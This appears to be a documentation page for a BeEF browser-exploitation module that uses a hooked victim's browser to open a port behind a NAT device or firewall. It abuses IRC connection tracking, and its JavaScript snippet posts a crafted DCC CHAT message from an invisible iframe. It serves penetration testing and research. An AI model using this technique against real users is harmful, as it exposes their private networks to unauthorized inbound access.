## Summary

* **Objective**: Use the IRC protocol to open a port behind NAT devices
* **Authors**: Bart Leppens
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/network/nat_pinning_irc)

## Internal Working

The firewall/NAT-device must support IRC connection tracking. BeEF will automatically bind a socket on port 6667 (IRC). Then you can connect to the victims public IP on that port.

```js
var myIframe = beef.dom.createInvisibleIframe();
var myForm = document.createElement("form");
var action = "http://" + connectto + ":6667/"

myForm.setAttribute("name", "data");
myForm.setAttribute("method", "post");
//it must be multipart/form-data so the message appears on separate line
myForm.setAttribute("enctype", "multipart/form-data");
myForm.setAttribute("action", action);


//create message, refer Samy Kamkar (http://samy.pl/natpin/)
x = String.fromCharCode(1);
var s = 'PRIVMSG beef :'+x+'DCC CHAT beef '+dot2dec(privateip)+' '+privateport+x+"\n";

```


## References

* [Opening closed ports on NAT device and bypassing stateful firewalls with BeEF , BeEF blog](http://blog.beefproject.com/2012/07/opening-closed-ports-on-nat-device-and.html)
* [NAT Pinning: Penetrating routers and firewalls from a web page](http://samy.pl/natpin/)
* [Video](http://www.youtube.com/watch?v=oDnzTYwo8p4)

## Feedback
